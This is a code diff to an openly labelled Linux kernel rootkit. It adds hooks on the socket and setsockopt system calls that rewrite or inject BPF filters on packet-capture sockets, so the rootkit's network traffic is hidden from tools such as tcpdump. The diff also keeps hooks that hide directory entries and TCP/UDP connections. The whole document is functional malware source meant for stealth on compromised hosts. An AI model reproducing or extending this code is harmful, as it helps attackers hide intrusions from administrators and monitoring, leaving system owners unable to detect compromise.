@@ -26,6 +26,10 @@
 #include "capabilities/hiding/module.h"
 #endif
 
+#ifdef ROOTI_PCAP_FILTER_METHOD_PROG
+#include "capabilities/hiding/net.h"
+#endif
+
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Omri Ben Zikri");
 MODULE_DESCRIPTION("Very fun rootkit");
@@ -50,10 +54,16 @@ static asmlinkage long (*orig_getdents64)(const struct pt_regs *regs);
 
 static int (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);
 static int (*orig_udp4_seq_show)(struct seq_file *seq, void *v);
+
+#ifndef ROOTI_PCAP_FILTER_METHOD_PROG
 static int (*orig_packet_rcv)(struct sk_buff *skb, struct net_device *dev,
                               struct packet_type *pt, struct net_device *orig_dev);
 static int (*orig_tpacket_rcv)(struct sk_buff *skb, struct net_device *dev,
                                struct packet_type *pt, struct net_device *orig_dev);
+#else
+static asmlinkage long (*orig_socket)(const struct pt_regs *regs);
+static asmlinkage long (*orig_setsockopt)(const struct pt_regs *regs);
+#endif
 
 static ssize_t (*orig_random_read_iter)(struct kiocb *kiocb, struct iov_iter *iter);
 static ssize_t (*orig_urandom_read_iter)(struct kiocb *kiocb, struct iov_iter *iter);
@@ -165,6 +175,8 @@ static int hook_udp4_seq_show(struct seq_file *seq, void *v)
     return orig_udp4_seq_show(seq, v);
 }
 
+#ifndef ROOTI_PCAP_FILTER_METHOD_PROG
+
 static int hook_packet_rcv(struct sk_buff *skb, struct net_device *dev,
                            struct packet_type *pt, struct net_device *orig_dev)
 {
@@ -200,6 +212,114 @@ static int hook_tpacket_rcv(struct sk_buff *skb, struct net_device *dev,
         BUG();
     }
 }
+
+#else
+
+static asmlinkage long hook_socket(const struct pt_regs *regs)
+{
+    struct file *file;
+    struct socket *sock;
+    int family = regs->di;
+    int fd;
+    int err;
+
+    fd = orig_socket(regs);
+    if (fd == -1 || family != AF_PACKET) {
+        return fd;
+    }
+
+    file = fget(fd);
+    if (file == NULL) {
+        ROOTI_DEBUG("fget() failed");
+        goto out_file_from_fd;
+    }
+
+    sock = sock_from_file(file);
+    if (sock == NULL) {
+        ROOTI_DEBUG("sock_from_file() failed");
+        goto out_sock_from_file;
+    }
+
+    lock_sock(sock->sk);
+
+    err = rooti_overwrite_packet_filter(sock->sk);
+    if (err) {
+        ROOTI_DEBUG("rooti_overwrite_packet_filter() failed: %d", err);
+        goto out_overwrite_filter;
+    }
+
+out_overwrite_filter:
+    release_sock(sock->sk);
+out_sock_from_file:
+    fput(file);
+out_file_from_fd:
+    return fd;
+}
+
+static asmlinkage long hook_setsockopt(const struct pt_regs *regs)
+{
+    struct file *file;
+    struct socket *sock;
+    struct sock_fprog user_fprog;
+
+    int fd = regs->di;
+    int optname = regs->dx;
+    int optlen = regs->r8;
+    sockptr_t optval = USER_SOCKPTR((char __user *)regs->r10);
+    int err;
+
+    err = orig_setsockopt(regs);
+    if (err) {
+        return err;
+    }
+
+    file = fget(fd);
+    if (file == NULL) {
+        ROOTI_DEBUG("fget() failed");
+        goto out_file_from_fd;
+    }
+
+    sock = sock_from_file(file);
+    if (sock == NULL) {
+        ROOTI_DEBUG("sock_from_file() failed");
+        goto out_sock_from_file;
+    }
+
+    lock_sock(sock->sk);
+
+    switch (optname)
+    {
+    case SO_ATTACH_FILTER:
+        err = copy_bpf_fprog_from_user(&user_fprog, optval, optlen);
+        if (err) {
+            ROOTI_DEBUG("copy_bpf_fprog_from_user() failed: %d", err);
+            goto out_attach_detach;
+        }
+
+        err = rooti_inject_packet_filter(sock->sk, &user_fprog);
+        if (err) {
+            ROOTI_DEBUG("rooti_inject_packet_filter() failed: %d", err);
+            goto out_attach_detach;
+        }
+        break;
+
+    case SO_DETACH_FILTER:
+        rooti_overwrite_packet_filter(sock->sk);
+        break;
+
+    default:
+        break;
+    }
+
+out_attach_detach:
+    release_sock(sock->sk);
+out_sock_from_file:
+    fput(file);
+out_file_from_fd:
+    return 0;
+}
+
+#endif
 
 // Should really be flagged as noreturn but that raises an objtool warning
 static void hook_do_exit(long code)
@@ -319,8 +439,13 @@ struct rooti_func_hook rooti_func_hooks[] = {
     ROOTI_FUNC_HOOK(ROOTI_SYSCALL_NAME("sys_getdents64"), hook_getdents64, &orig_getdents64),
     ROOTI_FUNC_HOOK("tcp4_seq_show", hook_tcp4_seq_show, &orig_tcp4_seq_show),
     ROOTI_FUNC_HOOK("udp4_seq_show", hook_udp4_seq_show, &orig_udp4_seq_show),
+#ifndef ROOTI_PCAP_FILTER_METHOD_PROG
     ROOTI_FUNC_HOOK("packet_rcv", hook_packet_rcv, &orig_packet_rcv),
     ROOTI_FUNC_HOOK("tpacket_rcv", hook_tpacket_rcv, &orig_tpacket_rcv),
+#else
+    ROOTI_FUNC_HOOK(ROOTI_SYSCALL_NAME("sys_socket"), hook_socket, &orig_socket),
+    ROOTI_FUNC_HOOK(ROOTI_SYSCALL_NAME("sys_setsockopt"), hook_setsockopt, &orig_setsockopt),
+#endif
     ROOTI_FUNC_HOOK("do_exit", hook_do_exit, &orig_do_exit),
     ROOTI_FUNC_HOOK("random_read_iter", hook_random_read_iter, &orig_random_read_iter),
     ROOTI_FUNC_HOOK("urandom_read_iter", hook_random_read_iter, &orig_urandom_read_iter)
